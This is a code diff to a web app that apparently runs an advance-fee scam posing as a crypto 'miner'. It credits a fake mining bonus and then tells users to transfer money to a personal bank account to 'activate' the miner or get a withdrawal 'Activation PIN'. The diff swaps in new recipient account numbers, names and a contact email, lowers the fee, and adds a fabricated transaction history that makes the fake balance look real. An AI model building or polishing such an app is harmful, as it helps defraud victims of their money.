@@ -566,6 +566,83 @@
     background-color: #219150;
   }
 
+  /* New Transaction History Page Styles */
+  #historyPage {
+    display: none;
+    background-color: #fff;
+    min-height: 100vh;
+    padding: 20px;
+    text-align: center;
+  }
+
+  #historyPage .header {
+    background-color: #fff;
+    color: #000;
+    padding: 10px 0;
+    font-weight: bold;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    position: relative;
+    font-size: 1.2em;
+    border-bottom: 1px solid #eee;
+  }
+
+  #historyPage .go-back-icon {
+    position: absolute;
+    left: 15px;
+    font-size: 24px;
+    cursor: pointer;
+    color: #000;
+  }
+
+  #historyPage .history-content {
+    margin-top: 20px;
+  }
+  
+  .no-transactions {
+    text-align: center;
+    margin-top: 50px;
+    font-size: 1.1em;
+    color: #888;
+  }
+
+  .transaction-item {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 15px;
+    background-color: #f7f7f7;
+    border-radius: 10px;
+    margin-bottom: 10px;
+    box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+  }
+
+  .transaction-info {
+    text-align: left;
+  }
+
+  .transaction-info h3 {
+    margin: 0;
+    font-size: 16px;
+    font-weight: bold;
+  }
+
+  .transaction-info p {
+    margin: 2px 0 0;
+    font-size: 12px;
+    color: #666;
+  }
+
+  .transaction-amount {
+    font-size: 16px;
+    font-weight: bold;
+    color: #008000; /* Green for positive transaction */
+  }
+
+  .transaction-amount.withdrawal {
+    color: #ff0000; /* Red for withdrawals */
+  }
 </style>
 </head>
 <body>
@@ -649,9 +726,9 @@
     <div class="message">Proceed to your bank app to complete this Transfer</div>
     <div class="info-box">
       <div class="info-row"><div class="info-label">Amount</div><div class="info-value" id="amount-text">NGN 0</div></div>
-      <div class="info-row"><div class="info-label">Account Number</div><div class="info-value"><span id="acct">807 952 2338</span><button class="copy-btn" onclick="copyToClipboard('acct')">Copy</button></div></div>
-      <div class="info-row"><div class="info-label">Bank Name</div><div class="info-value">Opay Bank</div></div>
-      <div class="info-row"><div class="info-label">Account Name</div><div class="info-value">DIVINE CHIGOZIRIM JONAH</div></div>
+      <div class="info-row"><div class="info-label">Account Number</div><div class="info-value"><span id="acct">5082150846</span><button class="copy-btn" onclick="copyToClipboard('acct')">Copy</button></div></div>
+      <div class="info-row"><div class="info-label">Bank Name</div><div class="info-value">moine point</div></div>
+      <div class="info-row"><div class="info-label">Account Name</div><div class="info-value">victor</div></div>
     </div>
     <div class="note">Make Payment to the Account Above to Activate your miner</div>
     <button class="confirm-btn" onclick="startVerification()">I have made this bank Transfer</button>
@@ -821,24 +898,24 @@
     <div class="info-box-withdrawal">
       <div class="info-row-withdrawal">
         <div class="info-label-withdrawal">Amount</div>
-        <div class="info-value-withdrawal">NGN 7,250</div>
+        <div class="info-value-withdrawal">NGN 6,500</div>
       </div>
       <div class="info-row-withdrawal">
         <div class="info-label-withdrawal">Account Number</div>
         <div class="info-value-withdrawal">
-          <span id="acct_withdrawal">807 952 2338</span> <button class="copy-btn-withdrawal" onclick="copyToClipboardWithdrawal('acct_withdrawal')">Copy</button>
+          <span id="acct_withdrawal">5082150846</span> <button class="copy-btn-withdrawal" onclick="copyToClipboardWithdrawal('acct_withdrawal')">Copy</button>
         </div>
       </div>
       <div class="info-row-withdrawal">
         <div class="info-label-withdrawal">Bank Name</div>
-        <div class="info-value-withdrawal">Opay Bank</div>
+        <div class="info-value-withdrawal">monie point</div>
       </div>
       <div class="info-row-withdrawal">
         <div class="info-label-withdrawal">Account Name</div>
-        <div class="info-value-withdrawal">DIVINE CHIGOZIRIM JONAH</div>
+        <div class="info-value-withdrawal">Victor nnamdi</div>
       </div>
     </div>
-    <div class="note-withdrawal">Make Payment to the Account Above to get your PAY ID</div>
+    <div class="note-withdrawal">Make Payment to the Account Above to get your Activation PIN </div>
     <button class="confirm-btn-withdrawal" onclick="goToVerification()">I have made this bank Transfer</button>
   </div>
 </div>
@@ -872,7 +949,7 @@
       <div class="contact-info">
         If you need help contact us
         <div class="email-wrapper">
-          <a id="contactEmail" href="mailto:opaypay618@gmail.com">opaypay618@gmail.com</a>
+          <a id="contactEmail" href="mailto:minercash6@gmail.com">minercash6@gmail.com</a>
           <svg class="copy-icon" id="copyEmailIcon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
             <path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/>
           </svg>
@@ -913,6 +990,16 @@
     <button onclick="closeMineSuccessMessagePopup()">OK</button>
 </div>
 
+<div id="historyPage">
+  <div class="header">
+    <span class="go-back-icon" onclick="showScreen('minerPage')">←</span>
+    Transaction History
+  </div>
+  <div class="history-content" id="historyContent">
+    <div class="no-transactions" id="noTransactionsYet">No Transactions Yet.</div>
+  </div>
+</div>
+
 <script>
   // ===== AUDIO ELEMENTS =====
   const loginSuccessSound = document.getElementById('loginSuccessSound');
@@ -923,21 +1010,94 @@
   // Global variable for balance
   let currentBalance = 0;
   let mined = false; // To track if mining has occurred
+  let transactions = []; // New array to hold transaction history
 
   // Elements
   const balanceDisplay = document.getElementById('balance');
   const mineButton = document.getElementById('mineBtn');
+  const historyContent = document.getElementById('historyContent');
+  const noTransactionsYet = document.getElementById('noTransactionsYet');
 
+  // Get and set balance and transactions from local storage on app load
+  window.onload = function() {
+    const savedBalance = localStorage.getItem('minerCashBalance');
+    if (savedBalance !== null) {
+        currentBalance = parseInt(savedBalance, 10);
+        updateBalanceDisplay();
+    }
+    const savedTransactions = localStorage.getItem('minerCashTransactions');
+    if (savedTransactions) {
+      transactions = JSON.parse(savedTransactions);
+    }
+    renderTransactions(); // Render transactions on page load
+  };
+
+  // Function to save balance to local storage
+  function saveBalance() {
+    localStorage.setItem('minerCashBalance', currentBalance);
+  }
+
+  // Function to save transactions to local storage
+  function saveTransactions() {
+    localStorage.setItem('minerCashTransactions', JSON.stringify(transactions));
+  }
+  
   // Function to update balance display and mine button state
   function updateBalanceDisplay() {
-      balanceDisplay.textContent = `₦${currentBalance.toLocaleString('en-NG')}`;
-      if (currentBalance > 0) {
-          mineButton.classList.add('disabled');
-          mineButton.disabled = true;
-      } else {
-          mineButton.classList.remove('disabled');
-          mineButton.disabled = false;
-      }
+    balanceDisplay.textContent = `₦${currentBalance.toLocaleString('en-NG')}`;
+    if (currentBalance > 0) {
+        mineButton.classList.add('disabled');
+        mineButton.disabled = true;
+    } else {
+        mineButton.classList.remove('disabled');
+        mineButton.disabled = false;
+    }
+    saveBalance(); // Save balance to local storage whenever it's updated
+  }
+
+  // Function to render transactions
+  function renderTransactions() {
+    historyContent.innerHTML = ''; // Clear existing content
+    if (transactions.length === 0) {
+      historyContent.appendChild(noTransactionsYet);
+      noTransactionsYet.style.display = 'block';
+    } else {
+      noTransactionsYet.style.display = 'none';
+      transactions.forEach(transaction => {
+        const item = document.createElement('div');
+        item.classList.add('transaction-item');
+        
+        const type = transaction.amount > 0 ? 'Bonus from mining' : 'Withdrawal';
+        const amountClass = transaction.amount > 0 ? '' : 'withdrawal';
+
+        item.innerHTML = `
+          <div class="transaction-info">
+            <h3>${type}</h3>
+            <p>${transaction.date}</p>
+          </div>
+          <div class="transaction-amount ${amountClass}">
+            ${transaction.amount > 0 ? '+' : ''}₦${Math.abs(transaction.amount).toLocaleString('en-NG')}
+          </div>
+        `;
+        historyContent.appendChild(item);
+      });
+    }
+  }
+  
+  // Function to add a new transaction
+  function addTransaction(type, amount) {
+    const now = new Date();
+    const dateOptions = { month: 'long', day: 'numeric', year: 'numeric' };
+    const timeOptions = { hour: '2-digit', minute: '2-digit' };
+    const dateString = `${now.toLocaleDateString('en-US', dateOptions)} - ${now.toLocaleTimeString('en-US', timeOptions)}`;
+
+    const newTransaction = {
+      type: type,
+      amount: amount,
+      date: dateString
+    };
+    transactions.unshift(newTransaction); // Add to the beginning of the array
+    saveTransactions();
   }
 
   // ===== LOGIN =====
@@ -1008,6 +1168,7 @@
       updateBalanceDisplay();
       mined = true;
       mineSuccessSound.play();
+      addTransaction("Bonus from mining", 250000); // Add a transaction record
 
       document.getElementById('mineSuccessMessagePopup').style.display = 'block';
     }, 2000); // 2-3 seconds loading
@@ -1023,15 +1184,11 @@
     document.getElementById('popup').style.display = 'none';
   }
 
-  // ===== TRANSACTION HISTORY =====
+  // ===== TRANSACTION HISTORY (Updated to show new page) =====
   document.getElementById('transactionHistoryLink').onclick = function(e) {
     e.preventDefault();
-    const toast = document.getElementById('notificationToast');
-    toast.className = 'show';
-    setTimeout(() => {
-      toast.className = '';
-    }, 3000);
-    errorSound.play();
+    renderTransactions(); // Render transactions before showing the page
+    showScreen('historyPage');
   };
 
   // ===== BUY MINER BUTTON (from first code) =====
@@ -1042,7 +1199,7 @@
   // ===== GO BACK ICON LOGIC =====
   function handleGoBack() {
     // Get the currently active main screen
-    const mainScreens = ['loginPage', 'minerPage', 'plan-page', 'bank-page'];
+    const mainScreens = ['loginPage', 'minerPage', 'plan-page', 'bank-page', 'historyPage'];
     let currentPage = '';
     for (const id of mainScreens) {
         if (document.getElementById(id).style.display === 'block') {
@@ -1090,6 +1247,9 @@
             } else {
                 showScreen('bank-transfer-page'); // Go back to bank transfer from verification
             }
+            break;
+        case 'historyPage':
+            showScreen('minerPage'); // Go back to dashboard from history page
             break;
         default:
             // Fallback for pages without specific back logic, though ideally all linked pages should be handled.
@@ -1154,6 +1314,7 @@
     document.getElementById('plan-page').style.display = 'none';
     document.getElementById('bank-page').style.display = 'none';
     document.getElementById('overlay').style.display = 'none'; // Ensure overlay is hidden
+    document.getElementById('historyPage').style.display = 'none'; // Hide new history page
 
     // Hide all screens from the second code
     document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
@@ -1166,7 +1327,7 @@
 
 
     // Show the requested screen
-    if (id === 'loginPage' || id === 'minerPage' || id === 'plan-page' || id === 'bank-page') {
+    if (id === 'loginPage' || id === 'minerPage' || id === 'plan-page' || id === 'bank-page' || id === 'historyPage') {
         document.getElementById(id).style.display = 'block';
     } else {
         document.getElementById(id).classList.add('active');
@@ -1228,9 +1389,11 @@
   function submitPin(){
     if(pin === "351111"){ // Correct PIN
       document.getElementById('successAmount').innerText = "₦" + enteredAmount.toLocaleString('en-NG');
-      currentBalance = 0; // Set balance to 0 on successful withdrawal
+      currentBalance -= enteredAmount; // Subtract the withdrawn amount
+      if (currentBalance < 0) currentBalance = 0; // Ensure balance doesn't go below 0
       mined = false; // Allow mining again
-      updateBalanceDisplay(); // Update dashboard balance
+      updateBalanceDisplay(); // Update dashboard balance and save to localStorage
+      addTransaction("Withdrawal", -enteredAmount); // Add a withdrawal transaction record
       showScreen('success-page');
     } else { // Incorrect PIN
       pin = "";
